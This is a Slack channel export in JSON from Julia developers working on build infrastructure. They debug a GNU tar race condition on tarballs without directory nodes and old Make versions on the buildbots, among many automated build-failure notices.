{"cursor": 13, "messages": [{"client_msg_id":"083dbbfa-2eca-44a5-bf4e-df4c265552f7","type":"message","text":"```$ curl -L -O <https://github.com/JuliaBinaryWrappers/Zlib_jll.jl/releases/download/Zlib-v1.2.12%2B1/Zlib.v1.2.12.x86_64-linux-gnu.tar.gz>\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  152k  100  152k    0     0   714k      0 --:--:-- --:--:-- --:--:--  714k\n$ /usr/local/bin/gtar zxvf Zlib.v1.2.12.x86_64-linux-gnu.tar.gz\ninclude/zconf.h\ninclude/zlib.h\nlib/libz.a\nlib/libz.so\nlib/libz.so.1\nlib/libz.so.1.2.11\nlogs/Zlib.log.gz\nshare/licenses/Zlib/README\nshare/man/man3/zlib.3\nshare/pkgconfig/zlib.pc```","user":"U66GD0880","ts":"1615246477.045000","team":"T68168MUP","edited":{"user":"U66GD0880","ts":"1615246480.000000"},"blocks":[{"type":"rich_text","block_id":"KN3","elements":[{"type":"rich_text_preformatted","elements":[{"type":"text","text":"$ curl -L -O "},{"type":"link","url":"https://github.com/JuliaBinaryWrappers/Zlib_jll.jl/releases/download/Zlib-v1.2.12%2B1/Zlib.v1.2.12.x86_64-linux-gnu.tar.gz"},{"type":"text","text":"\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  152k  100  152k    0     0   714k      0 --:--:-- --:--:-- --:--:--  714k\n$ /usr/local/bin/gtar zxvf Zlib.v1.2.12.x86_64-linux-gnu.tar.gz\ninclude/zconf.h\ninclude/zlib.h\nlib/libz.a\nlib/libz.so\nlib/libz.so.1\nlib/libz.so.1.2.11\nlogs/Zlib.log.gz\nshare/licenses/Zlib/README\nshare/man/man3/zlib.3\nshare/pkgconfig/zlib.pc"}]}]}]},{"client_msg_id":"973b016d-76d2-46a1-904b-035c9c47b246","type":"message","text":"This confuses gtar to think you’re using an different tar format (<https://www.gnu.org/software/tar/manual/html_node/Directory-Modification-Times-and-Permissions.html>)","user":"U67BXBF99","ts":"1615246503.045300","team":"T68168MUP","attachments":[{"title":"GNU tar 1.34: Directory Modification Times and Permissions","title_link":"https://www.gnu.org/software/tar/manual/html_node/Directory-Modification-Times-and-Permissions.html","text":"GNU tar 1.34: Directory Modification Times and Permissions","fallback":"GNU tar 1.34: Directory Modification Times and Permissions","from_url":"https://www.gnu.org/software/tar/manual/html_node/Directory-Modification-Times-and-Permissions.html","service_icon":"https://www.gnu.org/favicon.ico","service_name":"gnu.org","id":1,"original_url":"https://www.gnu.org/software/tar/manual/html_node/Directory-Modification-Times-and-Permissions.html"}],"blocks":[{"type":"rich_text","block_id":"TZ+f","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"This confuses gtar to think you’re using an different tar format ("},{"type":"link","url":"https://www.gnu.org/software/tar/manual/html_node/Directory-Modification-Times-and-Permissions.html"},{"type":"text","text":")"}]}]}]},{"client_msg_id":"e0ad2b22-5501-4964-895b-6f4727a2e579","type":"message","text":"yeah, it mostly works, it just isn’t well tested and will fail sometimes","user":"U67BXBF99","ts":"1615246526.045700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"DEHF","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"yeah, it mostly works, it just isn’t well tested and will fail sometimes"}]}]}]},{"client_msg_id":"bafb78e3-6334-47a4-acdc-380dfdd37778","type":"message","text":"Apparently it helps save memory, by avoiding holding the `mode` bits in-memory until late","user":"U67BXBF99","ts":"1615246687.046900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"fBFW","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Apparently it helps save memory, by avoiding holding the "},{"type":"text","text":"mode","style":{"code":true}},{"type":"text","text":" bits in-memory until late"}]}]}]},{"client_msg_id":"5afbd949-f321-4e6e-a25f-0cb9831d4546","type":"message","text":"And maybe even avoids an easy syscall, by doing several extra, slow syscalls?","user":"U67BXBF99","ts":"1615246793.047900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"XhtlJ","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"And maybe even avoids an easy syscall, by doing several extra, slow syscalls?"}]}]}]},{"client_msg_id":"9165c10b-711c-481b-b7ca-b01ee48d490c","type":"message","text":"FWIW I’ve never seen it fail","user":"U66GD0880","ts":"1615247608.048100","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"LJl","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"FWIW I’ve never seen it fail"}]}]}]},{"client_msg_id":"76996bf4-0e28-45af-99b6-e7d6b333ff42","type":"message","text":"Every tarball served by the Package Server is normalized to not include directory nodes","user":"U66GD0880","ts":"1615247634.048700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"GRm","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Every tarball served by the Package Server is normalized to not include directory nodes"}]}]}]},{"client_msg_id":"58c75f86-9620-4097-8423-194f94c21956","type":"message","text":"you just did","user":"U67BXBF99","ts":"1615248348.048900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"fAF","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"you just did"}]}]}]},{"client_msg_id":"29b06117-24d2-4936-a4da-de75d91185c5","type":"message","text":"that is the entire point of this channel","user":"U67BXBF99","ts":"1615248371.049200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"ZiY","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"that is the entire point of this channel"}]}]}],"reactions":[{"name":"joy","users":["U680THK2S"],"count":1}]},{"client_msg_id":"04ab27c2-8832-4dd4-b397-0e7678afda0a","type":"message","text":"We could be a bit more Artifacts like in `deps`, and isolate things into their own directories","user":"U67BXBF99","ts":"1615248427.050000","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"UD2s9","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"We could be a bit more Artifacts like in "},{"type":"text","text":"deps","style":{"code":true}},{"type":"text","text":", and isolate things into their own directories"}]}]}]},{"client_msg_id":"6f5242b4-799d-4681-bbea-cb7c82ed14e0","type":"message","text":"But currently we dont’","user":"U67BXBF99","ts":"1615248430.050200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"A01V","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"But currently we dont’"}]}]}]},{"client_msg_id":"2c5e76a1-b832-49d6-81c5-a3ac2d28fd53","type":"message","text":"can you explain the problem a bit more?  According to Stefan it’s totally legal to omit directory nodes from a tar stream","user":"U66GD0880","ts":"1615248627.050800","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"9F/","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"can you explain the problem a bit more?  According to Stefan it’s totally legal to omit directory nodes from a tar stream"}]}]}]},{"client_msg_id":"f1edf85c-958e-4034-862f-b736315d3e27","type":"message","text":"It is mostly supported, there’s just a bug in gtar that it triggers where sometimes it’ll error if run on a non-empty initial directory","user":"U67BXBF99","ts":"1615249942.051500","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"BIIE","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"It is mostly supported, there’s just a bug in gtar that it triggers where sometimes it’ll error if run on a non-empty initial directory"}]}]}]},{"client_msg_id":"3feb6fb2-7eb1-40d0-830e-e1439bbc6360","type":"message","text":"```while [ true ]; do tar xf ../Zlib.v1.2.12.x86_64-linux-gnu.tar ; done```\nI just ran this thousands of times and it never fails.   Is there some other criteria that must be present to trigger the bug?","user":"U66GD0880","ts":"1615250249.052400","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"SJYV=","elements":[{"type":"rich_text_preformatted","elements":[{"type":"text","text":"while [ true ]; do tar xf ../Zlib.v1.2.12.x86_64-linux-gnu.tar ; done"}]},{"type":"rich_text_section","elements":[{"type":"text","text":"\nI just ran this thousands of times and it never fails.   Is there some other criteria that must be present to trigger the bug?"}]}]}]},{"client_msg_id":"91BC2B83-3B58-4F31-BB70-BC05DA639AC8","type":"message","text":"Mutiple threads","user":"U67BXBF99","ts":"1615250878.052800","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"dQy","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Mutiple threads"}]}]}]},{"client_msg_id":"715FBCA3-9C32-4744-AEF6-8FF2267AD73E","type":"message","text":"Or use the internal checkpoint options to insert the race explicitly","user":"U67BXBF99","ts":"1615250961.053500","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"JTmw","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Or use the internal checkpoint options to insert the race explicitly"}]}]}]},{"client_msg_id":"ac0698a2-f36f-47f3-8980-f43746411907","type":"message","text":"got it; multiple `tar` invocations did it","user":"U66GD0880","ts":"1615251036.053900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"pPutt","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"got it; multiple "},{"type":"text","text":"tar","style":{"code":true}},{"type":"text","text":" invocations did it"}]}]}]},{"client_msg_id":"ef095085-130d-4bcc-8fbe-eab51741018b","type":"message","text":"I suppose it’s because of those `unlinkat()` syscalls that it’s making?","user":"U66GD0880","ts":"1615251095.054300","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"3qy4=","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"I suppose it’s because of those "},{"type":"text","text":"unlinkat()","style":{"code":true}},{"type":"text","text":" syscalls that it’s making?"}]}]}]},{"client_msg_id":"4efb6e37-0791-4e3e-a041-639615efa5b8","type":"message","text":"nah, it is because it does `while (true); open(file) || (isdir(dir) ? error(\"file couldn't be opened\") : mkdir(dir))`","user":"U67BXBF99","ts":"1615253108.055500","team":"T68168MUP","edited":{"user":"U67BXBF99","ts":"1615253124.000000"},"blocks":[{"type":"rich_text","block_id":"jPe5T","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"nah, it is because it does "},{"type":"text","text":"while (true); open(file) || (isdir(dir) ? error(\"file couldn't be opened\") : mkdir(dir))","style":{"code":true}}]}]}]},{"client_msg_id":"2b148c61-bc72-4242-93e0-2e5c099e41d2","type":"message","text":"whereas bsdtar does the obvious thing","user":"U67BXBF99","ts":"1615253174.055900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"az+","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"whereas bsdtar does the obvious thing"}]}]}]},{"client_msg_id":"c757da7b-2d80-46e8-8119-0661c14b1073","type":"message","text":"```mkdir(dir); open(file)```","user":"U67BXBF99","ts":"1615253206.056600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"Mqwt","elements":[{"type":"rich_text_preformatted","elements":[{"type":"text","text":"mkdir(dir); open(file)"}]}]}]},{"client_msg_id":"8688c6c2-301f-4184-8908-bb7cf7f1fbf7","type":"message","text":"which is great, because it actually works and is much simpler","user":"U67BXBF99","ts":"1615253228.057100","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"RINw","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"which is great, because it actually works and is much simpler"}]}]}]},{"client_msg_id":"6af12b1b-5d23-4c8a-b80d-baf0206fee5b","type":"message","text":"Also apparently we don’t pass -U to gnutar, though we should be","user":"U67BXBF99","ts":"1615253622.057700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"wkf","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Also apparently we don’t pass -U to gnutar, though we should be"}]}]}]},{"client_msg_id":"b0186359-5f57-405a-a498-735926c6366b","type":"message","text":"Ah, right, apparently we don’t do that because gnutar thinks that “Remove each file” applies to directories","user":"U67BXBF99","ts":"1615254557.058300","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"H1w","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Ah, right, apparently we don’t do that because gnutar thinks that “Remove each file” applies to directories"}]}]}]},{"client_msg_id":"f9a8c327-104d-4a3d-99b6-b83458a2202d","type":"message","text":"so things are just worse there","user":"U67BXBF99","ts":"1615254585.058600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"DQn6K","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"so things are just worse there"}]}]}]},{"type":"message","subtype":"bot_message","text":"Builder tester_freebsd64 on tabularasa_freebsd-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/4/builds/1496>","ts":"1615275457.058700","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder auto_reload on tabularasa_freebsd-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/40/builds/15>","ts":"1615308563.058800","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/52/builds/1594>","ts":"1615310587.058900","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/34/builds/1378>","ts":"1615321886.059000","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-nanosoldier1_1 failed: <https://build.julialang.org/#builders/16/builds/1356>","ts":"1615321886.059100","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-amdci6_1 failed: <https://build.julialang.org/#builders/51/builds/1354>","ts":"1615321886.059200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/52/builds/1598>","ts":"1615321890.059300","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/34/builds/1380>","ts":"1615322205.059400","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/51/builds/1356>","ts":"1615322206.059500","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/16/builds/1358>","ts":"1615322207.059600","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-nanosoldier1_1 failed: <https://build.julialang.org/#builders/52/builds/1600>","ts":"1615322212.059700","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-nanosoldier1_1 failed: <https://build.julialang.org/#builders/51/builds/1357>","ts":"1615322276.059800","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/16/builds/1359>","ts":"1615322277.059900","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-amdci6_1 failed: <https://build.julialang.org/#builders/34/builds/1381>","ts":"1615322278.060000","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/52/builds/1601>","ts":"1615322279.060100","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/51/builds/1358>","ts":"1615322758.060200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-nanosoldier1_1 failed: <https://build.julialang.org/#builders/16/builds/1360>","ts":"1615322760.060300","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/34/builds/1382>","ts":"1615322761.060400","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/52/builds/1602>","ts":"1615322763.060500","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/34/builds/1383>","ts":"1615322882.060700","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/16/builds/1361>","ts":"1615322884.060800","bot_id":"B01FNM61TE0"},{"client_msg_id":"f39ac885-3d7b-40f8-8fdd-dd640788796c","type":"message","text":"<@U66GD0880> Is our `make` version antique?","user":"U67BXBF99","ts":"1615322887.061000","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"qiif","elements":[{"type":"rich_text_section","elements":[{"type":"user","user_id":"U66GD0880"},{"type":"text","text":" Is our "},{"type":"text","text":"make","style":{"code":true}},{"type":"text","text":" version antique?"}]}]}]},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/51/builds/1359>","ts":"1615322888.061100","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-amdci6_1 failed: <https://build.julialang.org/#builders/52/builds/1603>","ts":"1615322890.061200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-nanosoldier1_1 failed: <https://build.julialang.org/#builders/51/builds/1360>","ts":"1615322968.061300","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-amdci6_1 failed: <https://build.julialang.org/#builders/34/builds/1384>","ts":"1615322968.061400","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/16/builds/1362>","ts":"1615322969.061500","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/52/builds/1604>","ts":"1615322973.061600","bot_id":"B01FNM61TE0"},{"client_msg_id":"2444ff80-5579-453e-aacd-5ae810c4b742","type":"message","text":"This flag is from 2013 <https://jaxenter.com/gnu-make-4-0-adds-guile-output-sync-breaks-fewer-things-2-106859.html>","user":"U67BXBF99","ts":"1615323034.061800","team":"T68168MUP","attachments":[{"service_name":"JAXenter","title":"GNU Make 4.0 adds Guile &amp; output-sync, breaks fewer things - JAXenter","title_link":"https://jaxenter.com/gnu-make-4-0-adds-guile-output-sync-breaks-fewer-things-2-106859.html","text":"Can the ubiquitous compiling tools first release in three years make up for the widely-panned Make 3.82?","fallback":"JAXenter: GNU Make 4.0 adds Guile &amp; output-sync, breaks fewer things - JAXenter","thumb_url":"https://jaxenter.com/wp-content/uploads/2013/10/make-guile.png","ts":1381330440,"from_url":"https://jaxenter.com/gnu-make-4-0-adds-guile-output-sync-breaks-fewer-things-2-106859.html","thumb_width":300,"thumb_height":200,"id":1,"original_url":"https://jaxenter.com/gnu-make-4-0-adds-guile-output-sync-breaks-fewer-things-2-106859.html"}],"blocks":[{"type":"rich_text","block_id":"IBLe","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"This flag is from 2013 "},{"type":"link","url":"https://jaxenter.com/gnu-make-4-0-adds-guile-output-sync-breaks-fewer-things-2-106859.html"}]}]}]},{"client_msg_id":"e7378b34-4267-4101-ba8c-0c9cecc7447f","type":"message","text":"yes, it’s probably antique since we build on very old distros","user":"U66GD0880","ts":"1615323059.062200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"n5y8","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"yes, it’s probably antique since we build on very old distros"}]}]}]},{"client_msg_id":"6a57d65d-b6c1-4e68-8410-9b7d0d42be81","type":"message","text":"Yeah some of the buildbots use Make 3.81","user":"U66GD0880","ts":"1615323082.062500","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"C7IPx","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Yeah some of the buildbots use Make 3.81"}]}]}],"reactions":[{"name":"older_man","users":["U680THK2S"],"count":1}]},{"client_msg_id":"62ae0e49-0ed2-4a08-acad-c30071125b7e","type":"message","text":"sigh","user":"U67BXBF99","ts":"1615323115.062800","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"=ugyB","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"sigh"}]}]}]},{"client_msg_id":"1523b54f-ce15-495c-84d2-d303a85043ee","type":"message","text":"Something that would be interesting is to do all C compilation in BB, then transfer things over to native machines for Julia bootstrap/sysimg generation","user":"U66GD0880","ts":"1615323210.064200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"4pM","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Something that would be interesting is to do all C compilation in BB, then transfer things over to native machines for Julia bootstrap/sysimg generation"}]}]}]},{"client_msg_id":"c0019f42-c768-44c5-b83e-7cf85f2556d1","type":"message","text":"Since that is the only non-cross-compilable portion of the build","user":"U66GD0880","ts":"1615323240.064600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"gU2P","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Since that is the only non-cross-compilable portion of the build"}]}]}]},{"client_msg_id":"16934585-b36c-4677-bbb1-7138687cb779","type":"message","text":"Seems we must exclude the good things to be windows-only then","user":"U67BXBF99","ts":"1615323254.064900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"wZS0","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Seems we must exclude the good things to be windows-only then"}]}]}],"reactions":[{"name":"+1","users":["U66GD0880"],"count":1}]},{"client_msg_id":"39c5dbc9-1874-4320-a253-b22cbd3dbaab","type":"message","text":"FreeBSD has `gmake v4.3`","user":"U66GD0880","ts":"1615323291.065600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"I2H","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"FreeBSD has "},{"type":"text","text":"gmake v4.3","style":{"code":true}}]}]}],"reactions":[{"name":"sunglasses","users":["U680THK2S"],"count":1},{"name":"freebsd","users":["U680THK2S"],"count":1},{"name":"first_place_medal","users":["U680THK2S"],"count":1},{"name":"joy","users":["U66GD0880"],"count":1},{"name":"alex_arslan","users":["U66GD0880"],"count":1}]},{"client_msg_id":"41ff4247-9b19-4976-806d-625cbe36c323","type":"message","text":"Can you update that on buildbot then, from `!= mac` to `== win || freebsd`","user":"U67BXBF99","ts":"1615323297.065700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"xqApC","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Can you update that on buildbot then, from "},{"type":"text","text":"!= mac","style":{"code":true}},{"type":"text","text":" to "},{"type":"text","text":"== win || freebsd","style":{"code":true}}]}]}]},{"client_msg_id":"3bdc123a-69fa-4b10-a2a8-72800bead0e9","type":"message","text":"done","user":"U66GD0880","ts":"1615323423.065900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"rp9","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"done"}]}]}]},{"client_msg_id":"1c9acb0c-cf2b-4eb5-a772-23dcf7c288b2","type":"message","text":"Okay if I merge <https://github.com/JuliaLang/julia/pull/39956> also now?","user":"U67BXBF99","ts":"1615323440.066100","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"pLNs","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Okay if I merge "},{"type":"link","url":"https://github.com/JuliaLang/julia/pull/39956"},{"type":"text","text":" also now?"}]}]}]},{"client_msg_id":"eec5f7d2-a75d-4b85-ae37-76463e55d1e5","type":"message","text":"We could use a pattern rule (<https://www.gnu.org/software/make/manual/make.html#Pattern-Intro>) but I feel like I hate pattern rules","user":"U67BXBF99","ts":"1615323618.066500","team":"T68168MUP","attachments":[{"title":"GNU make","title_link":"https://www.gnu.org/software/make/manual/make.html#Pattern-Intro","text":"GNU make","fallback":"GNU make","from_url":"https://www.gnu.org/software/make/manual/make.html#Pattern-Intro","service_icon":"https://www.gnu.org/favicon.ico","service_name":"gnu.org","id":1,"original_url":"https://www.gnu.org/software/make/manual/make.html#Pattern-Intro"}],"blocks":[{"type":"rich_text","block_id":"Iuum","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"We could use a pattern rule ("},{"type":"link","url":"https://www.gnu.org/software/make/manual/make.html#Pattern-Intro"},{"type":"text","text":") but I feel like I hate pattern rules"}]}]}]},{"client_msg_id":"f36ac583-acc3-4c40-a8a7-2b3b4f814c10","type":"message","text":"So currently the secondary output is just left unspecified","user":"U67BXBF99","ts":"1615323644.067000","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"bIfhL","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"So currently the secondary output is just left unspecified"}]}]}]},{"client_msg_id":"f11ad85d-ccd1-4a67-9d75-abc8964a7741","type":"message","text":"Maybe I should also stop hating pattern rules","user":"U67BXBF99","ts":"1615323660.067300","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"RUb","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"Maybe I should also stop hating pattern rules"}]}]}]},{"client_msg_id":"8da303b7-d473-497d-87c3-8c9389ae2533","type":"message","text":"yeah looks good to me","user":"U66GD0880","ts":"1615323795.067500","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"LJT","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"yeah looks good to me"}]}]}]},{"client_msg_id":"7621ba66-5470-47e0-9684-9c35b059a194","type":"message","text":"which secondary output?","user":"U66GD0880","ts":"1615323810.067800","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"BYn","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"which secondary output?"}]}]}]},{"type":"message","subtype":"bot_message","text":"Builder doctest_linux64 on linux-x86_64-nanosoldier2_1 failed: <https://build.julialang.org/#builders/34/builds/1385>","ts":"1615323832.068200","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder llvmpasses_linux64 on linux-x86_64-amdci6_3 failed: <https://build.julialang.org/#builders/16/builds/1363>","ts":"1615323833.068400","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder analyzegc_linux64 on linux-x86_64-amdci6_2 failed: <https://build.julialang.org/#builders/51/builds/1361>","ts":"1615323833.068500","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/52/builds/1605>","ts":"1615323836.068600","bot_id":"B01FNM61TE0"},{"type":"message","subtype":"bot_message","text":"Builder package_linux64 on linux-x86_64-nanosoldier2_2 failed: <https://build.julialang.org/#builders/52/builds/1606>","ts":"1615323887.068700","bot_id":"B01FNM61TE0"},{"client_msg_id":"0c7b173d-865a-4d56-810a-82e8f923ea40","type":"message","text":"the .dll.a file","user":"U67BXBF99","ts":"1615323903.068900","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"6+7","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"the .dll.a file"}]}]}]},{"client_msg_id":"f0b74e8c-842b-4f50-aa66-36c00e2c43d3","type":"message","text":"yeah I think that’s fine","user":"U66GD0880","ts":"1615323930.069200","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"FBO2=","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"yeah I think that’s fine"}]}]}]},{"client_msg_id":"f57b2fab-294d-4bb7-8755-2b65b465a75e","type":"message","text":"nothing explicitly depends on it so good enough for me","user":"U66GD0880","ts":"1615323939.069600","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"li3L","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"nothing explicitly depends on it so good enough for me"}]}]}]},{"client_msg_id":"35c81a3d-6112-4ada-aa9f-b34ce93ae8de","type":"message","text":"If you write `out.a out.b: in` that says to run the rule once to make out.a and once to make out.b","user":"U67BXBF99","ts":"1615323972.070300","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"f2u","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"If you write "},{"type":"text","text":"out.a out.b: in","style":{"code":true}},{"type":"text","text":" that says to run the rule once to make out.a and once to make out.b"}]}]}]},{"client_msg_id":"fc3e5535-93bf-456a-a4dd-522e0625f295","type":"message","text":"if instead you write `%.a %.b: in`, that says to run the rule once to make `%.a` and `%.b`, where `%` = `out`","user":"U67BXBF99","ts":"1615324000.070900","team":"T68168MUP","edited":{"user":"U67BXBF99","ts":"1615324004.000000"},"blocks":[{"type":"rich_text","block_id":"FU1D","elements":[{"type":"rich_text_section","elements":[{"type":"text","text":"if instead you write "},{"type":"text","text":"%.a %.b: in","style":{"code":true}},{"type":"text","text":", that says to run the rule once to make "},{"type":"text","text":"%.a","style":{"code":true}},{"type":"text","text":" and "},{"type":"text","text":"%.b","style":{"code":true}},{"type":"text","text":", where "},{"type":"text","text":"%","style":{"code":true}},{"type":"text","text":" = "},{"type":"text","text":"out","style":{"code":true}}]}]}]},{"type":"message","subtype":"channel_join","ts":"1615324104.071200","user":"UM8JUNJG7","text":"<@UM8JUNJG7> has joined the channel"},{"client_msg_id":"b3998d77-df55-4bb1-92c9-ac347d394e2d","type":"message","text":"<@U66GD0880> Do you have a handle on <http://build.julialang.org|build.julialang.org> being down?","user":"U674T3KB3","ts":"1615345791.071700","team":"T68168MUP","blocks":[{"type":"rich_text","block_id":"shRb","elements":[{"type":"rich_text_section","elements":[{"type":"user","user_id":"U66GD0880"},{"type":"text","text":" Do you have a handle on 